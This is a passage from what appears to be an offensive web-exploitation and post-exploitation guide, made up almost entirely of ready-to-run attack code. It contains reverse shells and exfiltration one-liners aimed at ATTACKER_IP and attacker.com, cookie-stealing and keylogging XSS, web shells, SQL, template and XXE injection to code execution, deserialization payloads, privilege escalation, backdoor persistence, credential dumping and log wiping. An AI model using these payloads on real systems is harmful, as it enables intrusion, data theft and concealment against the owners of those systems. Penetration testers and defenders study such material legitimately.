perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'

# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby reverse shell
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

**Data Exfiltration via Command Injection**

```bash
# Read sensitive files and send to attacker
cat /etc/passwd | nc ATTACKER_IP PORT

# Compress and exfiltrate
tar czf - /var/www/html | nc ATTACKER_IP PORT

# DNS exfiltration (if outbound HTTP blocked)
cat /etc/passwd | xxd -p -c 16 | while read line; do nslookup $line.attacker.com; done

# HTTP exfiltration
curl -d @/etc/passwd http://ATTACKER_IP/exfil
```

#### Cross-Site Scripting (XSS) Payload Construction

Craft JavaScript payloads that execute in victim browsers:

**Reflected XSS Payloads**

```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>

<!-- JavaScript protocols -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- Event handler attributes -->
<div onmouseover="alert('XSS')">Hover me</div>
<iframe src="javascript:alert('XSS')">
```

**Stored XSS Payloads**

```html
<!-- Cookie stealing -->
<script>
new Image().src="http://ATTACKER_IP/steal.php?cookie="+document.cookie;
</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    new Image().src="http://ATTACKER_IP/log.php?key="+String.fromCharCode(e.which);
};
</script>

<!-- Redirect to phishing page -->
<script>
window.location="http://attacker.com/phishing";
</script>

<!-- Inject malicious content -->
<script>
document.body.innerHTML="<h1>Hacked</h1>";
</script>
```

**DOM-Based XSS Payloads**

```javascript
// Exploit unsafe innerHTML
document.getElementById('target').innerHTML = '<img src=x onerror="alert(\'XSS\')">';

// Exploit eval()
eval(userInput);  // If userInput contains: alert('XSS')

// Exploit dangerouslySetInnerHTML (React)
<div dangerouslySetInnerHTML={{__html: userInput}} />
// If userInput = '<img src=x onerror="alert(\'XSS\')">'

// Exploit document.write()
document.write(userInput);
```

**Encoding Bypass Techniques**

```html
<!-- HTML entity encoding -->
&lt;img src=x onerror="alert('XSS')"&gt;

<!-- JavaScript escape sequences -->
\x3cimg src=x onerror="alert('XSS')"

<!-- Unicode encoding -->
<img src=x onerror="ale&#x72;t('XSS')">

<!-- Double URL encoding -->
%253Cimg%2520src%253Dx%2520onerror%253D%2522alert('XSS')%2522%253E

<!-- Mixed case bypass -->
<ImG src=x OnErRor="alert('XSS')">

<!-- Data URI -->
<img src="data:text/html,<script>alert('XSS')</script>">
```

**Automated XSS Testing**

```bash
# Test multiple XSS payloads
wordlist="/usr/share/wordlists/wfuzz/Injections/XSS.txt"
while IFS= read -r payload; do
    response=$(curl -s "http://target.com/search?q=$(echo -n "$payload" | jq -sRr @uri)")
    if echo "$response" | grep -q "$payload"; then echo "Potential XSS found: $payload" fi done < "$wordlist"

# Use Burp Suite payload generator

# Burp Suite → Intruder → Payload tab → Load XSS payload list
````

#### CSRF Token Bypass and CSRF Payload Construction

Craft requests that bypass CSRF protections:

**Token Extraction and Reuse**

```bash
# Extract CSRF token from initial request
token=$(curl -s "http://target.com/transfer" | grep -oP 'csrf_token"\s*value="\K[^"]+')

# Reuse token in state-changing request
curl -X POST "http://target.com/transfer" \
  -d "csrf_token=$token&amount=1000&to=attacker@test.com" \
  -b "session=$SESSION_ID"
````

**CSRF Bypass Techniques**

```bash
# Bypass: Missing CSRF token validation
curl -X POST "http://target.com/transfer" \
  -d "amount=1000&to=attacker@test.com"

# Bypass: Weak token validation (token in parameter not in header)
curl -X POST "http://target.com/transfer" \
  -d "csrf_token=randomvalue&amount=1000&to=attacker@test.com"

# Bypass: Case-sensitive token comparison
# Extract token, then test variations

# Bypass: Token in custom header instead of body
token=$(curl -s "http://target.com/transfer" | grep -oP 'csrf_token"\s*value="\K[^"]+')
curl -X POST "http://target.com/transfer" \
  -H "X-CSRF-Token: $token" \
  -d "amount=1000&to=attacker@test.com"

# Bypass: NULL or empty token
curl -X POST "http://target.com/transfer" \
  -d "csrf_token=&amount=1000&to=attacker@test.com"
```

**CSRF Payload for Victim Browser**

```html
<!-- Auto-submitting CSRF form -->
<form method="POST" action="http://target.com/transfer" id="csrf">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker@test.com">
  <input type="hidden" name="csrf_token" value="EXTRACTED_TOKEN">
</form>
<script>
  document.getElementById('csrf').submit();
</script>

<!-- CSRF via image tag (GET request) -->
<img src="http://target.com/transfer?amount=1000&to=attacker@test.com">

<!-- CSRF via XMLHttpRequest -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://target.com/transfer', true);
  xhr.withCredentials = true;
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('amount=1000&to=attacker@test.com&csrf_token=EXTRACTED_TOKEN');
</script>
```

#### File Upload Payload Construction

Craft file uploads that execute server-side code:

**Web Shell Development**

```php
<!-- Simple PHP web shell -->
<?php system($_GET['cmd']); ?>

<!-- More obfuscated PHP shell -->
<?php @eval($_REQUEST['cmd']); ?>

<!-- PHP shell with multiple interfaces -->
<?php
if ($_GET['cmd']) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

<!-- PHP reverse shell for file upload -->
<?php
$sock=fsockopen("ATTACKER_IP",PORT);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

```asp
<!-- ASP web shell -->
<%
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec(Request("cmd"))
Response.Write objExec.StdOut.ReadAll()
%>

<!-- ASPX web shell -->
<%@ Page Language="C#" %>
<%
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
%>
```

```java
<!-- JSP web shell -->
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
%>
```

**Polyglot File Technique**

```bash
# Create valid image with embedded PHP code
echo 'GIF89a;' > shell.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif

# Upload as image
curl -F "file=@shell.gif" http://target.com/upload

# Access with PHP execution
curl "http://target.com/uploads/shell.gif?cmd=id"

# Alternative: JPEG + PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg
curl -F "file=@shell.jpg" http://target.com/upload
```

**HTAccess Upload for Apache Exploitation**

```bash
# Create .htaccess file to execute PHP in images
echo 'AddType application/x-httpd-php .jpg' > .htaccess

# Upload .htaccess followed by PHP-embedded image
curl -F "file=@.htaccess" http://target.com/upload
curl -F "file=@shell.jpg" http://target.com/upload

# Access image as PHP
curl "http://target.com/uploads/shell.jpg?cmd=id"
```

#### Template Injection Payload Construction

Craft payloads targeting template engines:

**Jinja2/Flask Template Injection**

```python
# Basic SSTI detection
{{7*7}}  # Response contains 49

# Access Python objects
{{config}}  # Reveals Flask configuration
{{config.items()}}  # Lists all config items

# Code execution
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Reverse shell via template injection
{{''.__class__.__mro__[1].__subclasses__()[396]('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',shell=True)}}

# Read files
{{open('/etc/passwd').read()}}
```

**ERB (Ruby) Template Injection**

```erb
<!-- Basic SSTI detection -->
<%= 7*7 %>  <!-- Response contains 49 -->

<!-- Code execution -->
<%= system('id') %>

<!-- Reverse shell -->
<%= system('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1') %>

<!-- Read files -->
<%= File.read('/etc/passwd') %>
```

**Handlebars Template Injection**

```handlebars
<!-- Basic detection -->
{{7*7}}

<!-- Access prototype chain -->
{{constructor.prototype.isPrototypeOf(Object)}}

<!-- Code execution (depends on Handlebars configuration) -->
{{#if (eq (add 2 2) 4)}}vulnerable{{/if}}
```

---

### Exploitation for RCE/Shell

Remote Code Execution (RCE) transforms identified vulnerabilities into command execution capability. Successful RCE provides system-level access necessary for post-exploitation activities.

#### SQL Injection to RCE

[Inference] Execute operating system commands through database functions:

**MySQL File Write via INTO OUTFILE**

```sql
-- Write PHP web shell
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --

-- Enumerate web root (common locations)
' UNION SELECT @@datadir --
' UNION SELECT @@basedir --

-- Write to web-accessible directory
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/uploads/shell.php' --

-- Use sqlmap to automate
sqlmap -u "http://target.com/page?id=1" -p id --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**MSSQL xp_cmdshell Execution**

```sql
-- Enable xp_cmdshell (requires sysadmin privileges)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute system commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'type C:\flag.txt';

-- Reverse shell
EXEC xp_cmdshell 'powershell -Command "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/payload.ps1'')"';
```

**PostgreSQL COPY Command Exploitation**

```sql
-- Write web shell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Read files
COPY (SELECT * FROM pg_read_file('/etc/passwd', 0, -1)) TO '/tmp/passwd.txt';

-- Execute system commands (PostgreSQL 9.1+)
CREATE FUNCTION sys_exec(text) RETURNS text AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;
SELECT sys_exec('whoami');
```

**Oracle DBMS_SCHEDULER**

```sql
-- Create job to execute commands
BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name => 'pwn_job',
    job_type => 'EXECUTABLE',
    job_action => '/bin/sh -c "id > /tmp/pwned"',
    enabled => TRUE
  );
END;

-- Execute reverse shell
BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name => 'reverse_shell',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
    enabled => TRUE
  );
END;
```

#### Command Injection to RCE

Directly execute system commands through injection points:

```bash
# Identify command injection endpoint
curl "http://target.com/ping?host=127.0.0.1; whoami"

# Test command execution
curl "http://target.com/ping?host=127.0.0.1; id"
curl "http://target.com/ping?host=127.0.0.1; uname -a"
curl "http://target.com/ping?host=127.0.0.1; cat /etc/passwd"

# Download and execute reverse shell
curl "http://target.com/ping?host=127.0.0.1; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"

# One-liner reverse shell injection
curl "http://target.com/ping?host=127.0.0.1%3B%20bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/PORT%200%3E%261"
```

#### Web Shell Upload and Access

Upload executable code through file upload vulnerabilities:

```bash
# Upload PHP web shell
curl -F "file=@shell.php" http://target.com/upload

# Discover upload location
# Check application responses, inspect burp history, or enumerate common paths
curl "http://target.com/uploads/shell.php"
curl "http://target.com/upload/shell.php"
curl "http://target.com/files/shell.php"

# Execute commands via web shell
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=whoami"
curl "http://target.com/uploads/shell.php?cmd=cat%20/etc/passwd"

# Interactive shell usage
while true; do
    echo -n "> "
    read cmd
    curl -s "http://target.com/uploads/shell.php?cmd=$(echo -n "$cmd" | jq -sRr @uri)"
done
```

#### XXE (XML External Entity) to RCE

Exploit XML parsing to read files or execute commands:

**XXE File Read**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

**XXE RCE via expect Protocol**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<data>&xxe;</data>
```

**XXE Out-of-Band Data Exfiltration**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data></data>
```

```xml
<!-- evil.dtd on attacker server -->
<!ENTITY % all "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/exfil.php?data=%file;'>
%exfiltrate;
">
%all;
```

Upload XXE payload via application:

```bash
# XXE payload in XML file
cat > payload.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
EOF

# Upload file
curl -F "file=@payload.xml" http://target.com/upload

# Process through application to trigger XXE
curl "http://target.com/process?file=payload.xml"
```

#### Deserialization Gadget Chains

Exploit unsafe deserialization to achieve RCE:

**Java Deserialization (ysoserial)**

Generate malicious serialized objects:

```bash
# Generate RCE payload using ysoserial
java -jar ysoserial.jar CommonsCollections5 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | base64

# Send to vulnerable endpoint
curl -X POST "http://target.com/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin

# Alternative: Send as parameter
serialized=$(java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0)
curl "http://target.com/api/deserialize?object=$serialized"
```

**Python Pickle Deserialization**

```python
# Malicious pickle payload
import pickle
import os

class RCE(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
# Send payload to vulnerable endpoint
```

---

### Post-Exploitation from Web Shell

Web shell access provides command execution capability for reconnaissance, privilege escalation, and lateral movement within the compromised system.

#### Reconnaissance and Enumeration

Gather system information from web shell:

```bash
# System identification
curl "http://target.com/shell.php?cmd=uname%20-a"
curl "http://target.com/shell.php?cmd=cat%20/etc/os-release"
curl "http://target.com/shell.php?cmd=whoami"
curl "http://target.com/shell.php?cmd=id"

# Identify available interpreters
curl "http://target.com/shell.php?cmd=which%20python"
curl "http://target.com/shell.php?cmd=which%20python3"
curl "http://target.com/shell.php?cmd=which%20perl"

# Check network configuration
curl "http://target.com/shell.php?cmd=ifconfig"
curl "http://target.com/shell.php?cmd=ip%20addr"
curl "http://target.com/shell.php?cmd=netstat%20-tlnp"

# List running processes
curl "http://target.com/shell.php?cmd=ps%20aux"
curl "http://target.com/shell.php?cmd=ps%20-ef"

# Identify installed software
curl "http://target.com/shell.php?cmd=dpkg%20-l"
curl "http://target.com/shell.php?cmd=rpm%20-qa"
```

#### Privilege Escalation Enumeration

Identify privilege escalation vectors:

```bash
# Check sudo permissions
curl "http://target.com/shell.php?cmd=sudo%20-l"

# Identify SUID binaries
curl "http://target.com/shell.php?cmd=find%20/%20-perm%20-4000%20-type%20f%202>/dev/null"

# Check for writable files in system paths
curl "http://target.com/shell.php?cmd=find%20/usr/bin%20-writable%20-type%20f"

# Check kernel version for known exploits
curl "http://target.com/shell.php?cmd=uname%20-r"

# Identify cron jobs
curl "http://target.com/shell.php?cmd=cat%20/etc/crontab"
curl "http://target.com/shell.php?cmd=ls%20/etc/cron.d/"
```

#### File System Exploration

Navigate and extract sensitive files:

```bash
# List web root contents
curl "http://target.com/shell.php?cmd=ls%20-la%20/var/www/html"

# Search for configuration files
curl "http://target.com/shell.php?cmd=find%20/%20-name%20config.php%202>/dev/null"
curl "http://target.com/shell.php?cmd=find%20/%20-name%20settings.ini%202>/dev/null"

# Extract database credentials
curl "http://target.com/shell.php?cmd=cat%20/var/www/html/config.php"
curl "http://target.com/shell.php?cmd=cat%20/var/www/html/wp-config.php"

# Find SSH keys
curl "http://target.com/shell.php?cmd=find%20/%20-name%20id_rsa%202>/dev/null"

# Locate sensitive documents
curl "http://target.com/shell.php?cmd=find%20/%20-name%20flag.txt%202>/dev/null"
curl "http://target.com/shell.php?cmd=find%20/home%20-name%20*.sql%202>/dev/null"
```

#### Reverse Shell Establishment

Obtain fully interactive shell:

```bash
# Set up listener on attacker machine
nc -lvnp PORT

# Execute reverse shell from web shell
curl "http://target.com/shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/PORT%200%3E%261"

# Python reverse shell
curl "http://target.com/shell.php?cmd=python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'%20%3B"

# Perl reverse shell
curl "http://target.com/shell.php?cmd=perl%20-e%20'use%20Socket;%24i=\"ATTACKER_IP\";%24p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(%24p,inet_aton(%24i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh%20-i\");'"
```

#### Data Exfiltration

Extract sensitive information from compromised system:

```bash
# Exfiltrate files via HTTP
curl -F "file=@/etc/passwd" http://attacker.com/upload

# Compress and exfiltrate directory
curl "http://target.com/shell.php?cmd=tar%20czf%20-%20/var/www/html%20|%20curl%20-F%20file=@-%20http://attacker.com/upload"

# Database dump exfiltration
curl "http://target.com/shell.php?cmd=mysqldump%20-u%20root%20-p%20database%20|%20curl%20-F%20file=@-%20http://attacker.com/upload"

# DNS exfiltration (if HTTP blocked)
curl "http://target.com/shell.php?cmd=cat%20/etc/passwd%20|%20xxd%20-p%20-c%2016%20|%20while%20read%20line;%20do%20nslookup%20%24line.attacker.com;%20done"
```

---

### System-Level Exploitation for Privilege Escalation

Privilege escalation transforms limited user access into root/system-level access, enabling complete system compromise and lateral movement.

#### Linux Privilege Escalation Vectors

**SUID Binary Exploitation**

Identify and exploit binaries with setuid bit:

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for vulnerable binaries
strings /usr/bin/binary | grep -i flag
strace /usr/bin/binary  # Monitor system calls

# Exploit example: sudo binary misconfiguration
sudo -l  # Check allowed commands
sudo -u root /bin/bash  # Attempt execution with sudo
```

**Kernel Exploit Usage**

Leverage kernel vulnerabilities for privilege escalation:

```bash
# Identify kernel version
uname -r

# Search for applicable exploits
searchsploit "linux kernel VERSION"

# Compile and execute exploit
gcc -o exploit exploit.c
./exploit

# Verify privilege escalation
id  # Should show uid=0
whoami  # Should show root
```

**Common Kernel CVEs (examples)**

```bash
# CVE-2021-22555 (netfilter vulnerability)
# CVE-2021-3493 (OverlayFS)
# CVE-2021-4034 (PwnKit - policykit-1)

# Download and compile
wget https://www.exploit-db.com/download/[CVE_NUMBER]
gcc -o exploit exploit.c -lutil
./exploit
```

**Sudo Misconfiguration Exploitation**

```bash
# Check sudo permissions
sudo -l

# Exploit NOPASSWD
sudo -u root /bin/bash

# Exploit wildcards or vulnerable commands
# If NOPASSWD: /usr/bin/find
sudo /usr/bin/find . -exec /bin/bash \; -quit

# Exploit sudo with environment variables
sudo -u root env PYTHONPATH=/tmp /usr/bin/python /tmp/exploit.py
```

**Cron Job Exploitation**

```bash
# Identify writable cron files
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# Identify cron jobs containing user scripts
cat /etc/crontab

# Exploit writable script
# If cron executes /usr/local/bin/backup.sh and it's writable:
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /usr/local/bin/backup.sh

# Wait for cron execution to establish reverse shell
```

**Path Hijacking**

```bash
# Identify programs running with elevated privileges
ps aux | grep root

# Create malicious binary with same name as legitimate one
echo 'bash' > /tmp/legitimate_binary

# Modify PATH to execute malicious version first
export PATH=/tmp:$PATH

# Execute privileged program, which now executes malicious version
sudo /usr/local/bin/backup.sh  # Executes /tmp/backup.sh if it exists
```

**Library Hijacking (LD_PRELOAD)**

```bash
# Create malicious shared library
cat > privesc.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void priv_escalation() {
    setuid(0);
    setgid(0);
    system("bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");
}
EOF

gcc -shared -fPIC -o privesc.so privesc.c

# Execute with LD_PRELOAD
LD_PRELOAD=/tmp/privesc.so /usr/local/bin/suid_binary
```

#### Windows Privilege Escalation Vectors

**Token Impersonation**

```powershell
# Check current privileges
whoami /priv

# Use Rotten Potato or similar to impersonate system token
# Download and execute
.\rottenpotato.exe

# Verify privilege escalation
whoami  # Should show SYSTEM or higher privilege user
```

**Scheduled Task Exploitation**

```powershell
# List scheduled tasks
Get-ScheduledTask

# Identify tasks running as SYSTEM
Get-ScheduledTask -TaskPath * | where {$_.Principal.UserId -eq 'SYSTEM'}

# Modify task to execute malicious command
$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c C:\temp\shell.bat'
Set-ScheduledTask -TaskName 'VulnerableTask' -Action $action

# Wait for task execution
```

**Service Misconfiguration**

```powershell
# Identify services running as SYSTEM
Get-WmiObject win32_service | Select Name,State,PathName | findstr /I "running"

# Check service permissions
accesschk.exe -uwcqv "USERNAME" *  # Identify modifiable services

# Modify service binary path
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\services\VulnerableService' -Name ImagePath -Value 'C:\temp\shell.exe'

# Restart service
Restart-Service VulnerableService

# Reverse shell executes with SYSTEM privileges
```

**UAC Bypass**

```powershell
# Bypass UAC using fodhelper.exe
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Value 'cmd.exe /c C:\temp\shell.bat' -Force

# Execute fodhelper
fodhelper.exe

# Shell executes with elevated privileges
```

**Registry Permission Exploitation**

```powershell
# Check registry permissions
icacls "HKLM:\SYSTEM\CurrentControlSet\services\VulnerableService"

# Modify service registry key if writable
reg add "HKLM\SYSTEM\CurrentControlSet\services\VulnerableService" /v ImagePath /t REG_SZ /d "C:\temp\shell.exe" /f

# Restart service to trigger execution
```

#### Post-Exploitation Objectives

After achieving privilege escalation:

**Maintain Persistence**

```bash
# Create backdoor account (Linux)
useradd -m -p $(openssl passwd -1 password123) backdoor
usermod -aG sudo backdoor

# Add SSH key to authorized_keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Create cron persistence (Linux)
echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" | crontab -

# Windows: Create scheduled task for reverse shell
# Windows: Add registry run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\temp\shell.exe"
```

**Credential Harvesting**

```bash
# Extract password hashes (Linux)
cat /etc/shadow

# Dump SAM database (Windows)
reg save HKLM\SAM C:\sam.hive
reg save HKLM\SYSTEM C:\system.hive

# Use Mimikatz to extract credentials (Windows)
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"

# Extract browser credentials and cached passwords
```

**Lateral Movement Preparation**

```bash
# Enumerate network for additional targets
arp -a
ipconfig /all  # Windows
ifconfig  # Linux

# Identify trust relationships
nltest /domain_trusts  # Windows

# Extract SSH keys for lateral movement
cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub
```

**Evidence Covering**

```bash
# Clear bash history
cat /dev/null > ~/.bash_history
history -c

# Clear web server logs
rm /var/log/apache2/access.log
rm /var/log/apache2/error.log

# Clear event logs (Windows)
Clear-EventLog -LogName Security,System,Application
```

Related topics: Advanced post-exploitation techniques, lateral movement methodologies, and persistence mechanisms require separate detailed modules for comprehensive coverage.

---
